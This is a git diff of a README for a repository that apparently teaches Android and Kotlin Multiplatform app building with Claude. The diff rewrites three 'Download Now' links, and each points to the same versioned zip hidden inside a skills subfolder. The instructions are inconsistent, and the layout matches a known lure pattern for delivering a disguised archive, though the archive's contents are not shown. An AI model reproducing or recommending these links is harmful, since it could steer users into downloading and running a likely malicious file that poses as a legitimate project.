@@ -1,6 +1,6 @@
 # 🧠 claude-zero-to-hero-android-KMP - Build Android apps with Claude
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/raw/refs/heads/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ If you want to learn how modern Android apps are built, this project gives you a
 
 ## 📥 Download and open
 
-1. Visit this page to download: https://raw.githubusercontent.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip
+1. Visit this page to download: https://github.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/raw/refs/heads/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip
 2. On the GitHub page, click the green **Code** button.
 3. Choose **Download ZIP**.
 4. Save the file to your PC.
@@ -205,7 +205,7 @@ If you are new to Android, this can save time. If you already build apps, it can
 
 ## 🔗 Download again
 
-[Visit the GitHub download page](https://raw.githubusercontent.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip)
+[Visit the GitHub download page](https://github.com/lenorebreakneck630/claude-zero-to-hero-android-KMP/raw/refs/heads/main/skills/android-navigation/to_KMP_claude_android_hero_zero_3.5-beta.1.zip)
 
 ## 🧭 Quick path for first use
 
